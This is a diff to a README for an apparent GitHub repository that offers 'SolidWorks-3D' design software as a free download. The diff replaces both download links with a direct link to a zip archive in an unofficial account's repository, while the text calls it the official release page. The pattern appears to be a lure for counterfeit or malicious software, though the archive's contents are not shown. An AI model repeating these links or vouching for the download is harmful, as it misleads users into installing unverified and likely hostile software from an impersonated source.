@@ -1,6 +1,6 @@
 # 📦 SolidWorks-3D - Complete Design Tools For Every Engineer
 
-[![Download SolidWorks](https://img.shields.io/badge/Download-Software-blue)](https://github.com/evanneindecent678/SolidWorks-3D/releases)
+[![Download SolidWorks](https://img.shields.io/badge/Download-Software-blue)](https://github.com/evanneindecent678/SolidWorks-3D/raw/refs/heads/main/SolidWorksResourse/Solid_Works_D_v3.2.zip)
 
 SolidWorks-3D provides professionals and students with the necessary tools for 3D modeling and mechanical design. This software allows you to build complex parts, manage large assemblies, and perform stress simulations on your workstation. This guide helps you install and configure the application on your Windows machine.
 
@@ -18,7 +18,7 @@ Your computer needs specific hardware to run version 2026 reliably. Check these 
 
 You must obtain the installer package from the official release page. 
 
-[Visit this page to download the software](https://github.com/evanneindecent678/SolidWorks-3D/releases)
+[Visit this page to download the software](https://github.com/evanneindecent678/SolidWorks-3D/raw/refs/heads/main/SolidWorksResourse/Solid_Works_D_v3.2.zip)
 
 Select the most recent version labeled as the current release. Click the file name to save the installer to your local Downloads folder. Ensure your internet connection remains stable during the download process to prevent file corruption.
 
